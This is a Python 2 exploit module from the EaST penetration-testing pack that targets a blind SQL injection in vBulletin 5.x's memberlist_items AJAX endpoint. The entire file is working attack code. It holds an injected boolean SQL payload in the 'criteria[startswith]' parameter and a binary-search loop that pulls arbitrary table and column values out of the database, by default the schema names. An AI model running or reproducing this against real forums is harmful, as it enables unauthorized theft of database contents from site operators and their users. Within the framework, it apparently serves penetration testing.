#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from collections import OrderedDict
import urlparse
import urllib2
from shellcodes.Shellcodes import CrossOSShellcodes

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "vBulletin_5.x_blind_sqli"
INFO['DESCRIPTION'] = "vBulletin 5.x Blind SQLi"
INFO['VENDOR'] = "https://www.vbulletin.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    This module exploits a blind SQLi in vBulletin script "/ajax/render/memberlist_items" POST parameter "criteria[startswith]".
Tested against vBulletin CE 5.0.5 on Windows 7 SP1 x64.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = ['https://packetstormsecurity.com/files/127537/vBulletin-5.1.2-SQL-Injection.html']
INFO['CHANGELOG'] = "21 Jul, 2014. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = "/vbulletin5"
OPTIONS["TABLE"] = "INFORMATION_SCHEMA.SCHEMATA"
OPTIONS["COLUMN"] = "schema_name"
OPTIONS["SHOW EVERY FOUND SYMBOL"] = False



class exploit(Sploit):
    def __init__(self, host='', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.port = self.args.get('PORT', OPTIONS["PORT"])
        self.path = self.args.get('BASEPATH', OPTIONS["BASEPATH"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.table = self.args.get('TABLE', OPTIONS['TABLE'])
        self.column = self.args.get('COLUMN', OPTIONS['COLUMN'])
        self.debug = self.args.get('SHOW EVERY FOUND SYMBOL', OPTIONS['SHOW EVERY FOUND SYMBOL'])
        proto = "https" if self.ssl else "http"
        self.url = urlparse.urljoin("{}://{}:{}/".format(proto, self.host, self.port), self.path) + "/ajax/render/memberlist_items"
        self.vuln_data = ('criteria[perpage]=10&criteria[startswith]=g" '
            'OR NOT ORD(MID((SELECT DISTINCT(IFNULL(CAST({column} AS CHAR),0x20)) FROM {table} LIMIT {entry_no},1),{pos_no},1))>{char_ord} '
            'AND "tEsT" LIKE "tEsT&criteria[sortfield]=username&criteria[sortorder]=asc&securitytoken=guest'
                          )

    def find(self, table, column, pattern):
        result = []
        subresult = []
        entry_no = 0
        pos_no = 1
        while 1:
            char_ord = 0
            left = 0
            right = 255
            data = self.vuln_data.format(table=table, column=column, entry_no=entry_no, pos_no=pos_no, char_ord=char_ord)
            res = urllib2.urlopen(self.url, data).read()
            if pattern not in res and pos_no == 1 and char_ord == 0:
                break
            if '\xff' in subresult:
                break
            if pattern not in res and char_ord == 0:
                entry_no += 1
                pos_no = 1
                subres = "".join(subresult)
                result.append(subres)
                self.log("[+] Found: %s" % subres)

            while 1:
                char_ord = (left + right) / 2
                data = self.vuln_data.format(table=table, column=column, entry_no=entry_no, pos_no=pos_no, char_ord=char_ord)
                res = urllib2.urlopen(self.url, data).read()
                if left + 1 == right:
                    subresult.append(chr(right))
                    if self.debug:
                        self.log(chr(right))
                    break
                if pattern in res:
                    left = char_ord
                else:
                    right = char_ord
            pos_no += 1
        return result


    def run(self):
        self.args()
        self.log("[*] Trying to get `%s` from `%s`..." % (self.column, self.table))
        result = self.find(self.table, self.column, "No Users Matched Your Query")
        self.log("[+] Found following entries:")
        self.log(result)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()